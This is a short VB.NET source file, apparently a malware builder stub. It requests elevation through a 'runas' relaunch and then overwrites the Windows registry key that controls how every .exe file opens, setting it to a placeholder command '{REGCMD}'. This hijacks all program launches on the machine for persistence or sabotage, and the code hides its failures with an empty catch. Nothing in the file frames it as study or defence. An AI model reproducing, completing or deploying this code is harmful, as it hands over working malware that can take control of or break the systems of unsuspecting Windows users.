Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.Security.Principal
Imports System.Reflection

Module Stub
    Sub Main()
        If Not IsAdmin() Then
            Dim si As New ProcessStartInfo()
            si.UseShellExecute = True
            si.Verb = "runas"
            si.FileName = Assembly.GetEntryAssembly().Location
            Process.Start(si)
            Return
        End If
        Try
            Dim rk As RegistryKey = Registry.ClassesRoot.OpenSubKey("exefile\shell\open\command", True)
            If rk Is Nothing Then rk = Registry.ClassesRoot.CreateSubKey("exefile\shell\open\command")
            rk.SetValue("", "{REGCMD}")
            rk.Close()
        Catch
        End Try
    End Sub

    Function IsAdmin() As Boolean
        Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
    End Function
End Module